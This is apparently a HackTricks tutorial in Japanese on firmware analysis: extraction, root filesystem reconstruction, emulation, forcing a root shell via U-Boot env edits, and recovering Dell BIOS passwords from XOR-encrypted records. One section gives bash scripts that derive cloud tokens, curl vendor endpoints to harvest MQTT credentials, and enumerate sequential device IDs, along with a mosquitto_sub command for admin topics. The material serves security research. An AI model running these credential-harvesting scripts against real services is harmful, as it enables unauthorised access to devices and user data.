# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

露出したハードウェアインターフェースから取得する方法については、[UARTコンソールを使ったファームウェアのダンプ](../hardware-hacking/uart.md#dumping-firmware-with-uart-console)と[SPI flashのダンプ](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)を参照してください。コンソールにアクセスする前に、起動時のUART通信を再現可能な方法でキャプチャするには、[SCPIで制御する電源とオシロスコープによる取得](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介し、デバイスを正常に動作させるための重要なソフトウェアです。永続メモリに保存されているため、デバイスの電源投入直後から必要な命令にアクセスでき、オペレーティングシステムの起動につながります。ファームウェアの調査と、場合によっては変更を行うことは、セキュリティ上の脆弱性を特定する重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成と使用されている技術を理解するための重要な初期ステップです。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行されているオペレーティングシステム
- ブートローダーの詳細
- ハードウェア構成とデータシート
- コードベースの規模とソースの場所
- 外部ライブラリとライセンスの種類
- 更新履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に有用です。また、利用可能なオープンソースソフトウェアコンポーネントを、手動および自動のレビューで分析することも重要です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールは、潜在的な問題を発見するために活用できる無料の静的解析を提供します。

## **ファームウェアの取得**

ファームウェアの取得にはさまざまな方法があり、それぞれ難易度が異なります。

- ソース（開発者、メーカー）から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- **Google dork**クエリを使って、ホストされたファームウェアファイルを探す
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使い、**cloud storage**に直接アクセスする
- 中間者攻撃の手法で**更新を傍受**する
- **UART**、[**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash)、または**PICit**などでデバイスに接続し、ファームウェアを**抽出**する
- デバイスの通信を調べ、更新要求を**盗聴**する
- **ハードコードされた更新エンドポイント**を特定して利用する
- ブートローダーまたはネットワークから**ダンプ**する
- ほかの方法がすべて失敗した場合は、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTログのみの場合：flash内のU-Boot envからroot shellを強制起動する

UART RXが無視される場合（ログのみ）、オフラインで**U-Boot環境変数のblobを編集**することで、init shellを強制起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env パーティションを特定し、`bootargs` を編集して `init=/bin/sh` を追加し、**blob の U-Boot env CRC32 を再計算**します。
3. env パーティションのみを書き戻して再起動すると、UART にシェルが表示されます。

これは、ブートローダーのシェルが無効になっていても、外部フラッシュアクセス経由で env パーティションを書き込める組み込みデバイスで有効です。

### Firewall のコピータスクを介した保護コードの漏えい

一部の MCU では、保護されていないアプリケーションコードから、保護された Flash を直接読み取る代わりに、保護領域のゲートウェイを呼び出せます。アプリケーションコードの実行権を得たら、各ゲートウェイタスクを個別のメモリ転送プリミティブとして調査します。Cypherock X1 の事例では、STM32L4 Firewall のコールゲートは、タスク、外部の `data` ポインター、長さ、および保護された `address` を受け取りました。書き込みタスクは、Firewall Code 内を指す `data` ソースポインターを拒否できませんでした。呼び出し元はそのコードを直接読み取れませんでしたが、ゲートウェイ自体がそれを、許可された読み取りタスクで読み出せる保護された不揮発性ストレージにコピーできました。<sup>[[15]](#references)</sup>

この種の漏えいを再現するには、対応する読み取りタスクがある、書き込み可能な保護ストレージページを特定し、書き込み元を保護コード内の連続したアドレスに設定して、ステージングしたバイトを読み戻します。書き込みを繰り返す前に、ストレージ媒体を確認してください。この事例では Flash だったため、ページを再利用するには消去が必要でした。研究者らは、有効な Secure Data Storage の内容を消去して復元するルーチンを使い、ウォレットデータを上書きせず、残りの空き領域にコードをステージングしました。これには MCU 上でのコード実行と、到達可能なコールゲートが必要です。未認証のホストから直接読み取りを回避する方法ではありません。<sup>[[15]](#references)</sup>

復元したコードから、[ファームウェア更新とブート整合性における信頼性の欠落](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata)が明らかになる可能性があります。<sup>[[15]](#references)</sup>

## ファームウェアの解析

**ファームウェアを入手した**ので、どのように扱うべきかを把握するために、その情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。高ければ、暗号化されている可能性があります（または何らかの形式で圧縮されています）。

さらに、以下のツールを使って**firmware 内に埋め込まれたファイル**を抽出できます。

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、ファイルを調べるには[**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）を使用できます。

### 外部 flash 内の raw ディスプレイアセット

外部 SPI dump が MCU の実行可能な firmware とは限りません。Cortex-M を対象とする場合は、コード候補領域の先頭をデバイスのメモリマップと照合してください。通常の vector table なら、妥当な SRAM stack pointer と、実行可能メモリ内の reset-handler address から始まります。offset zero に vector table がないからといって、chip 全体にコードがないとは限りません。他の offset や起動構成も調べてください。`binwalk` でコンテナが見つからない場合は、raw bytes を調べ、新しい画面を読み込む操作と、[decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) から得られた flash read address を照合してください。<sup>[[14]](#references)</sup>

ディスプレイアセット領域では、PNG/JPEG と決めつけずに、ピクセル形式と寸法の候補を試してください。引用したデバイスでは **80×160 RGB565 little-endian** のフレームが使われていました。1ピクセルあたり2バイトなので、フレームサイズは **25,600 bytes**（25 KiB）であり、24 kilobits ではありません。decoded flash-read address から画面アセットの offset を特定し、研究者は用意した画像を `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` で変換し、元の dump 内で同じサイズのアセットと置き換え、`flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` で書き込み、新しい画像がディスプレイに表示されることを確認しました。これは書き換え可能な*外部ディスプレイアセット*を示すものであり、MCU の内部 firmware の抽出や再書き込みを示すものではありません。書き込みの前に、元の dump を保管し、寸法、byte order、offset、置換後の長さを確認してください。<sup>[[14]](#references)</sup>

### Differential flash analysis と復元可能な XOR secret store

firmware の設定に文書化された保存形式がない場合は、まず条件を揃えて flash を複数回読み取り、**設定を1つだけ**変更してから chip 全体を再度 dump し、offset を比較します。値を制御して実験を繰り返すことで、その設定と counter や書き込みメタデータを区別できます。データがその場で更新されず、新しい offset に変化が現れる場合は、append-only または log-structured の store が使われていることを示しています。削除済み・tombstone 化されたエントリも保持してください。payload bytes が復元可能な状態で残っている場合があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraで書き込み処理と検証処理をリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、パディング、鍵のインデックス付け、鍵導出を確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロパディングから鍵を復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文から同じオフセットのキーストリームのバイトを特定できます。固定サイズのフィールドでは、ゼロパディングが繰り返しXOR鍵のすべてのインデックスを覆う場合、特に情報が漏れやすくなります。暗号化されたパディングから鍵のバイトを直接特定できるためです。これは、`0x00 XOR key_byte = key_byte`となるためです。鍵のすべてのインデックスが覆われていれば、暗号文の末尾から鍵を復元し、データが格納されたバイトを復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOSパスワード形式は、その具体例です。32バイトのフィールドのバイト`0`は平文で、バイト`1..31`には20バイトの繰り返し鍵が使われます。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワードの長さを `L` とすると、XOR の前は位置 `L..31` がゼロでした。`L <= 12` の場合、これらの位置がすべてのキーインデックスをカバーするため、ブルートフォースなしでキーとパスワード全体を復元できます:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去の記録から鍵を抽出する

各レコードを個別に分析してはいけません。DVAR key はおおよそ `modified_md5(device_seed || variable_GUID || password[0])` として導出されます。device seed と GUID は固定されており、パスワードに依存する入力は平文の先頭バイトだけです。そのため、デバイスごとの鍵は最大256個で、同じバイトで始まるレコードは同じ鍵を共有します。active record と deleted record をそのバイトごとにグループ化してください。短い過去のレコードは、padding を通じて鍵全体を漏らし、自身の padding だけでは不十分な現在の長いレコードを復号できる場合があります。そのため、古いciphertextを消去せず tombstone 化すると、パスワードのローテーションによって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool はDVARを検出し、候補レコードを検証し、パスワードを復元して、保存された生のデータや鍵のバイト列を表示できます。checkout からビルドし、検証済みのflash imageを次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、key entropy、キーの折り返し時の一貫性を使って false positive を排除してください。複数回のダンプで書き込みごとのビット反転がまばらに確認された場合は、観測されたマスクを列挙し、これらの制約に基づいて補正候補を順位付けしてください。ただし、ヒューリスティックな出力を正確な復元結果として提示せず、曖昧な文字はそのまま報告してください。<sup>[[12]](#references)</sup>

Password verifier には、可逆暗号文ではなく、salt を付加して反復処理した一方向ハッシュを保存してください。また、ログ構造型ストアでは、置き換えられた秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

前述のコメントアウトされたツール（`binwalk -ev <bin>` など）を使って、**ファイルシステムを抽出**できたはずです。\
Binwalk は通常、**ファイルシステムの種類を名前にしたフォルダー**内に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs です。

#### ファイルシステムの手動抽出

場合によっては、binwalk のシグネチャに**ファイルシステムのマジックバイトが含まれていない**ことがあります。この場合は、binwalk で**ファイルシステムのオフセットを見つけ、圧縮されたファイルシステムをバイナリから切り出して**、以下の手順に従い、その種類に応じてファイルシステムを**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

次の **ddコマンド**を実行して、Squashfsファイルシステムを切り出します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリ内に展開されます。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステム

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs ファイルシステム

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込み root filesystem の再構築

raw eMMC/SSD dump に有効な filesystem header が含まれている一方で、そのメタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損していると判断しないでください。組み込みの boot code は Device Mapper を使って、複数の物理範囲から実際の root device を構成することがあるため、GPT パーティションを 1 つだけ切り出しても、最初のセグメントしか取得できません。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得処理が完了していること、サイズが安定していること、そしてイメージを保持している書き込みプロセスがないことを確認してください。ファイル名に開始／終了アドレスが含まれている場合は、その範囲を実際のバイト数と比較してください。GPT は読み取り専用モードで復元し、必要な範囲だけをアタッチしてください。ワークステーション上で、信頼できない物理ボリュームに対して `vgchange -ay` を実行してはいけません。ボリュームグループの衝突や意図しない書き込みが発生する可能性があります。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックまたは LVM stack がイメージ全体を参照する必要がある場合は、使い捨ての VM を使ってください。標準の boot partition に残された過去の boot log は特に有用です。bootloader が proprietary container のオフセット、各 component の長さ、slot の選択、alignment のルール、signature verification を記録している場合があります。これらの値を使って、埋め込まれた command line、kernel、initramfs を切り出し、各出力を `file`、magic bytes、`binwalk` で個別に検証してください。container の末尾まで読み取ると、initrd、ACPI object、signature が誤って kernel に追加されることがあります。<sup>[[9]](#references)</sup>

#### boot-time block map を復元する

kernel の initramfs を展開し、その `/init` と storage library を reverse engineer します。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、partition path への string reference をたどり、アクティブな A/B slot を選択して table を構築するコードを追跡してください。radare2 の開始点としては、`r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` が役立ちます。<sup>[[9]](#references)</sup>

linear target は、仮想 device の連続する範囲を、1 つ以上の backing device の範囲に対応付けます。復元された 2 セグメントの table は、一般に次の形式です（位置と長さはすべて 512-byte sector 単位です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

マシンコードの算術演算を、整数幅、シフト、単位変換も含めて正確に再現してください。たとえば、次の式はバイトサイズをまず4 KiB境界に切り下げてから、512バイトセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブルの順序に従って範囲を上限付きのチャンクでコピーし、メディアダンプ全体をメモリに読み込まずにフラットな解析イメージを再構築します。これにより、ホスト側で mapper デバイスを作成することも避けられます。GPT から得たオフセット、反転したセクター数、最終的な出力長は、それぞれ別個のアサーションとして検証してください。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築エラーを見分ける

SquashFS では、`unsquashfs` を実行する前に、`hsqs` の magic を確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードしてください。互いに関連のない複数の構造で展開に失敗する場合は、予想される位置の周辺を広い範囲で検索し、構造として有力な候補があることを確認してください。候補には、解凍可能なメタデータブロック、連続して有効な複数のディレクトリエントリ、妥当な inode フィールド、inode 数と整合するルート inode、有効な整合性メタデータ構造などがあります。magic が 1 つ一致するだけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付き差分によって独立した構造体が有効になる場合（たとえば、ディレクトリのメタデータとverityレコード）、原因はバイトの欠落ではなく、セグメント開始位置の系統的な誤りである可能性が高いです。orphan recoveryやファイルシステムのメタデータのパッチを試す前に、逆算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクター／ページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護境界は分けて考えてください。TPMで封印されたLUKSボリュームはデータの機密性を保護し、署名済みのdm-verityマッピングはroot filesystemの完全性を保護します。software TPMでは、元の物理TPMに封印されたキーを復元できません。また、verity検証を省略する研究用のinitで改変済みのSquashFSを起動しても、その署名を偽造したことにも、dm-verityを破ったことにもなりません。<sup>[[9]](#references)</sup>

## ファームウェアの解析

ファームウェアを入手したら、その構造や潜在的な脆弱性を把握するために、詳しく調べることが重要です。この作業では、さまざまなツールを使ってファームウェアイメージを解析し、役立つデータを抽出します。

### 初期解析ツール

バイナリファイル（`<bin>`と表記）を初期検査するためのコマンドを紹介します。これらのコマンドを使うと、ファイル形式の特定、文字列の抽出、バイナリデータの解析、パーティションやファイルシステムの詳細の把握ができます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools**のドキュメントや、ファイルの検査に使える**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。抽出先は、多くの場合、ファイルシステムの種類（例: squashfs、ubifs）にちなんだディレクトリです。ただし、magic bytes が欠落しているために **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。これは、`binwalk` でファイルシステムのオフセットを特定し、続いて `dd` コマンドでファイルシステムを切り出す方法です:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステムの分析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、アップデートサーバーの機能、未コンパイルのコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

確認すべき**重要な場所**と**項目**には、次のものがあります。

- ユーザー認証情報を含む **etc/shadow** と **etc/passwd**
- **etc/ssl** 内のSSL証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプト
- さらなる分析のための組み込みバイナリ
- 一般的なIoTデバイスのWebサーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。

- 機密情報の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unixバイナリ向けの **checksec.sh** やWindowsバイナリ向けの **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## 派生URLトークンを使ったcloud設定とMQTT認証情報の収集

多くのIoTハブは、次のようなcloudエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析中に、`<token>` がハードコードされたシークレットを使ってデバイスIDからローカルで導出されていることが判明する場合があります。例:

- token = MD5( deviceId || STATIC_KEY ) で、大文字の16進数として表される

この設計では、deviceIdとSTATIC_KEYを知っている人なら誰でもURLを再構築してcloud設定を取得でき、多くの場合、平文のMQTT認証情報やトピックのプレフィックスが明らかになります。

実践的な手順:

1) UARTの起動ログからdeviceIdを抽出する

- 3.3V UARTアダプター（TX/RX/GND）を接続し、ログを取得します:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URLパターンとbrokerアドレスを出力する行を探します。例:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtokenアルゴリズムを復元する

- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索します。
- アルゴリズムを確認します（例：MD5(deviceId||STATIC_KEY)）。
- Bashでtokenを導出し、digestを大文字にします。

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud configとMQTT credentialsを収集する

- URLを組み立て、curlでJSONを取得する。jqで解析してsecretを抽出する:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL（存在する場合）を悪用する

- 回収した認証情報を使ってメンテナンス用 topic を subscribe し、機密性の高いイベントを探します。

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイスIDを列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、ベンダーのOUI／製品／タイプを示すバイト列の後に、連番のサフィックスが付いています。
- 候補となるIDを順に試し、トークンを導出して、プログラムから設定を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大規模な列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、対象ハードウェアを変更せずに秘密情報を復元できるよう、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレーションすることで、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となる場合がありますが、root filesystemや特定のバイナリを、Raspberry Piのようなアーキテクチャとエンディアンが一致するデバイス、または事前構築済みの仮想マシンに移すことで、さらにテストを進められます。

### 個々のバイナリのエミュレーション

単一のプログラムを調べる場合は、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレーションするには、次のコマンドを使用できます。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（big-endian）では `qemu-mips` を使用し、little-endian のバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARM バイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションが可能になります。これらのツールはプロセスを自動化し、動的解析を支援します。

### エミュレーション用に分割された検証済みルートファイルシステムを再構築する

SquashFS の superblock は読み取れるものの、inode、ディレクトリ、または fragment table のオフセットがあり得ない値になっている場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこから作成される block device の構成を再現してください。組み込みシステムでは、名目上の root partition が公開されていても、別の partition から借用したセクターを追加する `dm-linear` mapping によって、実際のファイルシステムが構築されていることがあります。superblock のみを確認するチェックは、後続のすべての metadata block がずれていても成功する場合があります。<sup>[[11]](#references)</sup>

ファームウェアの演算処理は正確に再現してください。特に、長さの単位がバイト、512-byte sector、4 KiB page のどれなのかを特定し、シフトと切り捨てを元の順序どおりに再現し、A/B layout のバンクごとに異なる末尾領域も考慮してください。たとえば `(partition_bytes >> 12) << 3` は、まず 4 KiB 境界で切り捨ててから、結果を 512-byte sector 単位で表します。これを `partition_bytes // 512` に置き換えると、追加される範囲が数キロバイトずれ、後続の SquashFS table がすべて破損する可能性があります。<sup>[[11]](#references)</sup>

有効な検証手順は次のとおりです。<sup>[[11]](#references)</sup>

1. 検証/init バイナリから、各 `dm-linear` segment の source device、開始セクター、長さを特定する。
2. alignment の扱いを変えずに、各 extent を連結するか mapping する。
3. それでも抽出に失敗する場合は、予測される境界の周辺の狭い範囲だけを検索し、妥当そうな superblock だけで判断せず、連続する複数の有効な metadata structure を確認する。
4. 再構築したイメージに変更を加えていない `unsquashfs` を実行する。すべてのディレクトリと fragment を正常にたどれることは、`unsquashfs -stat` より確かな証拠となる。

#### Analyst-controlled dm-verity replacement

アナリストが QEMU kernel、initramfs、virtual disk を制御できる場合、ベンダーの検証用 PID 1 を小さな静的リンク済み init に置き換えることで、変更した root を起動できます。これは**ラボでの boot-chain 置き換え**であり、dm-verity、RSA signature、Secure Boot、TPM に封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換え用 init は、元のブート経路の動作に関わる部分を再現する必要があります。`devtmpfs` を mount し、`setsid()` を呼び出し、`/dev/console` を file descriptor 0–2 に接続し、`/proc` と `/sys` を mount して、指定された block device が使えるようになるまで待機します。その後、編集した root を read-only で mount し、古い root の pseudo-filesystem を detach して、新しい mount を `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` の**前に**`/dev`、`/proc`、`/sys` を detach することで、新しい root に属する mount point を誤って detach するのを避けられます。<sup>[[11]](#references)</sup>

変更可能なデバイス状態は、変更した不変 root とは分離しておきます。qcow2 overlay を使うと、元のディスクの LVM state を保持しつつ、変更した SquashFS を別の read-only virtio disk から提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインのイメージ状態のデバッグ

起動の遅延、破壊的な起動スクリプト、または不安定なコンソールログによって障害の原因がわかりにくい場合は、ゲストの外部から永続状態を調べます。実行中のVMが使用しているoverlayは決して接続せず、`qemu-nbd`で公開し、LVMの検出対象を目的のNBDパーティションに限定して、切断する前にボリュームグループを無効化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現性のある fault isolation を行うには、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで確認してください。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了によって誤検知が発生することがあります。また、無関係なコードを変更する前に、各レイヤー間のインターフェースが正確に一致しているかを比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI driver ABI、PCI 情報から判定されるドライバー名を照合します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できないことがあります。<sup>[[11]](#references)</sup>

## 実践的な Dynamic Analysis

